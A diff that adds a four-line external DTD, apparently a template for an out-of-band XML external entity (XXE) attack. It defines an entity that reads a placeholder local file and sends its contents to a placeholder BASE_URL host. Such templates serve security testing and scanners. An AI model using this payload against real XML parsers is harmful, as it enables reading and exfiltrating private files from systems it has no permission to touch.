@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "LOCAL_FILE">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'BASE_URL/file?x=%file;'>">
+%eval;
+%exfiltrate;
